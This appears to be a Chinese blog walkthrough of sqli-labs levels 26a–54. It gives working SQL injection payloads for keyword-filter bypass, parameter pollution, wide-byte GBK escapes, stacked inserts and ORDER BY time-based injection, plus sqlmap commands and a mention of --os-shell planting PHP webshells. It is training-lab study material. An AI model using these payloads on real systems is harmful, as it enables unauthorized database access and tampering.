+<p>网上还有说 %a0 绕过的，好像和操作系统还是中间件有关系（好像要服务器是linux，%a0好像是 &amp;nbsp，html实体编码）</p>
+<p>应该还有别的方法，but 我好菜啊</p>
+<h1 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h1><p>用 %00 的话，多个括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)union(select(1),group_concat(column_name),(3)from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;)aandnd(table_name=&#x27;users&#x27;));%00</span><br></pre></td></tr></table></figure>
+
+<p>不用的话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)||(if(1=1,sleep(1),0))||(&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>tamper不会写，<del>呜呜呜</del></p>
+<h1 id="less-27（过滤了但是大小写敏感）"><a href="#less-27（过滤了但是大小写敏感）" class="headerlink" title="less-27（过滤了但是大小写敏感）"></a>less-27（过滤了但是大小写敏感）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这正则表达式区分大小写，可以改变几个字母的大小写来绕过，如果不改的话，select过滤了两次，要多加一个select</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;uunionnion(ssselectelectelect(1),group_concat(column_name),(3)from(information_schema.columns)where(table_schema=&#x27;security&#x27;)and(table_name=&#x27;users&#x27;));%00</span><br></pre></td></tr></table></figure>
+
+<p>仔细看一下，这次过滤的不是空白，只过滤空格，所以可以用其他空白字符替代空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x09	HT(horizontal tab)	水平制表符</span><br><span class="line">0x0A	LF(line feed)		换行</span><br><span class="line">0x0B	VT(vertical tab)	垂直制表符</span><br><span class="line">0x0C	FF(form feed)		换页</span><br><span class="line">0x0D	CR(carriage return)	回车</span><br><span class="line"></span><br><span class="line"># 以上描述来源网络</span><br><span class="line"># url编码前一部分应该是和ASCII码一样的，就把 0x09 换成 %09</span><br></pre></td></tr></table></figure>
+
+<p>我们改变大小写，并用其他空白字符代替空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;%09uNion%0aseleCt%0b1,group_concat(column_name),3%0cfrom%0dinformation_schema.columns%09where%09table_schema=&#x27;security&#x27;%09and%09table_name=&#x27;users&#x27;%09and%09&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h1><p>第一个和最后一个单引号换成双引号</p>
+<h1 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h1><p>双写的部分长一点，括号闭合一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)%09uniunion%09selecton%09select%0b1,group_concat(column_name),3%0cfrom%0dinformation_schema.columns%09where%09table_schema=&#x27;security&#x27;%09and%09table_name=&#x27;users&#x27;%09and%09(&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h1><p>过滤的关键字更少了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>
+
+<p>\s 表示空白，\s+ 表示 一个或一个以上的空白</p>
+<p>&#x2F;**&#x2F; 不是空白</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)%09union/**/select%0b1,group_concat(column_name),3%0cfrom%0dinformation_schema.columns%09where%09table_schema=&#x27;security&#x27;%09and%09table_name=&#x27;users&#x27;%09and%09(&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-29-SERVER和-GET交叉使用，HTTP-Parameter-Pollution以及逻辑漏洞"><a href="#less-29-SERVER和-GET交叉使用，HTTP-Parameter-Pollution以及逻辑漏洞" class="headerlink" title="less-29($_SERVER和$_GET交叉使用，HTTP Parameter Pollution以及逻辑漏洞)"></a>less-29($_SERVER和$_GET交叉使用，HTTP Parameter Pollution以及逻辑漏洞)</h1><p>index.php 中没有过滤，和 less-1 差不多吧</p>
+<p>login.php 中白名单过滤，但他这个感觉是有点问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line"><span class="variable">$id1</span>=<span class="title function_ invoke__">java_implimentation</span>(<span class="variable">$qs</span>);  <span class="comment">// 根据 &amp; 分割查询字符串</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];  <span class="comment">// 检查的和使用的字符串并不完全相同</span></span><br><span class="line"><span class="title function_ invoke__">whitelist</span>(<span class="variable">$id1</span>);  <span class="comment">// 检查分割后的是否为纯数字</span></span><br></pre></td></tr></table></figure>
+
+<p>whitelist，以数字开头结尾，一个或一个以上数字</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br></pre></td></tr></table></figure>
+
+<p>一开始想直接 <code>id=65535&amp;&#39;union select 1,2,3--+</code> 但从 $_GET 中取id参数，取出来的值也只有 &amp; 前面的，后来再试了一下 url编码，把 &amp; 换成 %26，但也不行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];  <span class="comment">// 不经过 url 解码</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];  <span class="comment">// 经过 url 解码</span></span><br></pre></td></tr></table></figure>
+
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=65535%26id=&#x27;union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;id&#x27;];  // 65535&amp;&#x27;union select 1,2,3--</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;];  // id=65535%26%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="尝试覆盖变量（HTTP-Parameter-Pollution）"><a href="#尝试覆盖变量（HTTP-Parameter-Pollution）" class="headerlink" title="尝试覆盖变量（HTTP Parameter Pollution）"></a>尝试覆盖变量（HTTP Parameter Pollution）</h2><p>我们尝试在 url 中传递两个 id 参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=65535&amp;id=&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>whitelist 函数中检查的是第一个找到的 id，至于 $_GET[‘id’] 会是第一个第二个还是别的什么不太清楚。试了一下，应该是第二个id</p>
+<p>后来发现，注释里面写了 HTTP Parameter Pollution（HTTP 参数污染），php是取最后一个参数，不同的语言可能会有不同的结果</p>
+<h2 id="构造一个比较长的字符串"><a href="#构造一个比较长的字符串" class="headerlink" title="构造一个比较长的字符串"></a>构造一个比较长的字符串</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id_value</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>);</span><br></pre></td></tr></table></figure>
+
+<p>生成 id1 变量（用于白名单检查）时，限制了长度，本来是挺正常的，但 sql语句中用的不是 id1，而是 $_GET[‘id’]，就出问题了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=11111111111111111111111111111111111111111111111111111111111&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="前两个字符-“id”"><a href="#前两个字符-“id”" class="headerlink" title="前两个字符 &#x3D;&#x3D; “id”"></a>前两个字符 &#x3D;&#x3D; “id”</h2><p>生成 id1 变量时，只比较前两个字符，第三个字符可以不是等号</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ida123&amp;id=&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h1><p>同29，单引号换成双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=65535&amp;id=&quot;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h1><p>同30，加个括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=65535&amp;id=&quot;)union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-32（宽字符-宽字节注入）"><a href="#less-32（宽字符-宽字节注入）" class="headerlink" title="less-32（宽字符&#x2F;宽字节注入）"></a>less-32（宽字符&#x2F;宽字节注入）</h1><p>宽字符&#x2F;宽字节注入，原理可以参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
+<p>好像要求字符集为 GBK，有没有其他要求不知道</p>
+<p>猜一下原因，反斜杠 ASCII 码值为 5C（gbk、utf8这些变长编码都兼容ASCII码，所以反斜杠还是 5C），而非最高位的字节为 5C 在gbk中是存在合法的码的。像utf8，多字节的码每个字节的最高位都是 1（5c &#x3D; 0101 1100），不存在合法的码。gb2312中好像也不行</p>
+<p>这关转义了 <code>&#39; &quot; \</code> 就在这些字符前面加反斜杠。如果我们传入id参数时在 单引号 前面加上 <code>%df</code> ，别的值也行，但是要超过 ASCII 码表示的范围（0x00 - 0x7f，%80好像也不行，不行就多试几个），<code>\xdf&#39;</code> 转义后为<code>\xdf\x5c&#39;</code> 字符集为 GBK 时，0xdf 不在单字节字符（0x00 - 0x7f）的范围内，所以 0xdf 被 mysql 认为是 多字节字符（GBK好像最多就两字节表示一个字符）的第一个字节，而 0x5c 被认为是第二个字节而不是反斜杠，单引号就逃逸了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=%df&#x27; union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">?id=%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+</span><br></pre></td></tr></table></figure>
+
+<p>mysql中字符串可直接用十六进制的值来表示，如 ‘security’ 为 0x7365637572697479</p>
+<p>至于sqlmap，有个tamper和宽字符注入相关，叫 unmagicquotes</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-32/?id=1 --technique=U --tamper=unmagicquotes</span><br></pre></td></tr></table></figure>
+
+
+
+<p>网上又说这样可以避免宽字符注入的，没试过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set character_set_client=binary</span><br></pre></td></tr></table></figure>
+
+<p>看了一下源码，和之前比多了个这个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h1><p>同 32</p>
+<p>代码中 32 使用正则表达式，33直接使用 addslashes</p>
+<h1 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h1><p>get换成post</p>
+<p>hackbar有点问题（还是说是我的问题），%df 说我 URI malformed，换burp suite</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+&amp;passwd=2&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h1><p>字符型换数字型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h1><p>同 32</p>
+<p>addslashes换成了 mysql_real_escape_string</p>
+<h1 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h1><p>同 34</p>
+<p>也是 addslashes 换成了 mysql_real_escape_string</p>
+<h1 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h1><p>堆叠注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)  <span class="comment">// 执行$sql中所有的sql语句</span></span><br></pre></td></tr></table></figure>
+
+<p>用分号分隔 sql语句，相当于可以执行任意的 sql 语句</p>
+<p>以下可以插入一条数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;;insert into users(username,password) values (&#x27;stacked&#x27;, &#x27;asd&#x27;);--+</span><br></pre></td></tr></table></figure>
+
+<p>之前的方法也可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p>这样虽然之后还有一部分不完整的sql语句（执行到后面时会报错），但问题不大，我们的联合查询可以正常执行</p>
+<p>堆叠注入可以配合 预处理（prepare） 来绕过某些过滤</p>
+<h1 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h1><p>同 38 字符型变成整型</p>
+<h1 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h1><p>index.php 没什么好关注的，就 38 加个括号好像</p>
+<p>两个同名文件大写开头的那个 Logged-in.php 没什么东西，之前解压时刚好把大写的那个覆盖了</p>
+<p>login.php 用get方法访问后直接重定向，再一看，怎么和 24 的那么像 啊</p>
+<p>摆了，不知道是我的问题还是本来就这样</p>
+<h1 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h1><p>和 39 比起来 少了报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h1><p>登录时存在堆叠注入，password没有转义单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: 随便</span><br><span class="line"></span><br><span class="line">password: &#x27; or 1=1;insert into users(username,password) values (&#x27;stacked2&#x27;,&#x27;asd&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>可以插入一条新的数据，还可以顺便登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p>可以联合注入，2是回显点</p>
+<h1 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h1><p>浏览器标题还是写着 Less-42，我还以为我电脑寄了</p>
+<p>github上面的 issues 中有人提出来了</p>
+<p>就加个括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password: &#x27;) or 1=1;insert into users(username,password) values (&#x27;stacked3&#x27;,&#x27;asd&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>要是在浏览器中不知道自己password有没有输错，可以把这个input 标签的 type 从 password 改成 text，在 F12 中修改，或者 右键 -&gt; 检查（谷歌浏览器是检查，其他浏览器可能叫法不一样）快速找到这个元素</p>
+<h1 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h1><p>一开始看和 42 一样，说是盲注，结果还有回显点</p>
+<p>vscode 左右拆分比较代码，发现这关没有报错信息</p>
+<p>emm。。。</p>
+<p>或许该去找一个比较代码差异的工具</p>
+<h1 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h1><p>好像又是比 44 多了个括号</p>
+<p>那摆了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password: &#x27;)union select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-46（order-by）"><a href="#less-46（order-by）" class="headerlink" title="less-46（order by）"></a>less-46（order by）</h1><p>拼接sql语句的位置在 order by 后面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>有本书把这种情况称为 注入点在 order by 后</p>
+<p>但好像还有种说法是把 sort 参数称为注入点</p>
+<p>感觉都挺有道理的？</p>
+<p>sqlmap 好像比较赞同第二种说法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checking if the injection point on GET parameter &#x27;sort&#x27; is a false positive</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不管了，order by 后面能接什么东西不知道，可以自己用 mysql 试一试</p>
+<p>试出来可以用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=extractvalue(0x0a,concat(0x0a,(select database())))</span><br></pre></td></tr></table></figure>
+
+<p>也可以用基于时间的盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=if(1=1,SLEEP(2),1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-47（order-by，单引号包裹）"><a href="#less-47（order-by，单引号包裹）" class="headerlink" title="less-47（order by，单引号包裹）"></a>less-47（order by，单引号包裹）</h1><p>sort 参数的值被单引号包裹</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>再用mysql 试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users ORDER BY &#x27;&#x27; and 1=1;</span><br></pre></td></tr></table></figure>
+
+<p>可以正常执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?sort=&#x27; and extractvalue(0x0a,concat(0x0a,(select database()))) and &#x27;</span><br><span class="line"></span><br><span class="line">?sort=&#x27; or if(1=1,SLEEP(2),1) and &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注的时候，if 前面如果是 and 就不行，难道是什么奇怪的短路求值？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不行奥 &#x27; and if(1=1,SLEEP(2),1)</span><br></pre></td></tr></table></figure>
+
+<p>order by 后面不接空字符串，用 and 又行了，可能真的是短路求值吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=123&#x27; and if(1=1,SLEEP(2),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>order by 后面接空字符串，无论 and 什么都为假，不执行 sleep 很合理</p>
+<p>sqlmap 也可以发现注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-47/?sort=1 --dbms=MySQL --technique=E</span><br></pre></td></tr></table></figure>
+
+<p>帮他一把省点时间，不然时间盲注这个表每有一行 sleep(1) 就多一秒，现在有十几行，sleep(1) 都得等十几秒，不知道是我出了什么问题还是本来就这样</p>
+<h1 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h1><p>报错信息没了，可以时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=if(1,sleep(1),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-48/?sort=1 --dbms=MySQL --technique=T -D security -T users --columns</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h1><p>好像就比 48 多两个单引号，就像 46 和 47 的差别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=&#x27; or if(1,sleep(1),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap也行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-49/?sort=1 --dbms=MySQL --technique=T --current-db</span><br></pre></td></tr></table></figure>
+
+
+
+<p>顺便试了一下sqlmap的 –os-shell</p>
+<p>用的时候sqlmap 会让你选择网站使用的语言（如PHP），和网站在服务器上的根目录</p>
+<p>成功了之后可以在服务器上看到网站根目录多了两个php写的木马</p>
+<p>退出之后就自动删除了</p>
+<p>使用这个需要满足一些条件</p>
+<p>mysql配置的 secure_file_priv （less-7），知道网站在服务器上的目录，以及要有相应权限（比如写文件到指定目录？网上说的）</p>
+<h1 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h1><p>堆叠注入，但无回显，有报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=extractvalue(0x0a,concat(0x0a,(select database())));</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h1><p>比 50 多个单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=&#x27; or extractvalue(0x0a,concat(0x0a,(select database())));</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h1><p>报错信息删了</p>
+<h1 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h1><p>多个单引号</p>
+<h1 id="less-54-（challenge，常规sql注入流程）"><a href="#less-54-（challenge，常规sql注入流程）" class="headerlink" title="less-54 （challenge，常规sql注入流程）"></a>less-54 （challenge，常规sql注入流程）</h1><p>描述</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The objective of this challenge is to dump the (secret key) from only random table from Database (&#x27;CHALLENGES&#x27;) in Less than 10 attempts</span><br><span class="line">For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</span><br></pre></td></tr></table></figure>
+
+<p>大致意思是表名随机，而且查询一定次数会重新生成表名</p>
+<p>只有表名会变，所以试列数回显点什么的多试几次也没什么问题，数据库名字也给了</p>
+<p>sqlmap不知道会不会直接寄</p>
+<p>测试是否存在注入（&#x2F;&#x2F; 后面为注释，解释这一步的目的），可以直接猜，少试几个，比如一些字段不太可能是纯数字，那数字型的测试就可以跳过</p>
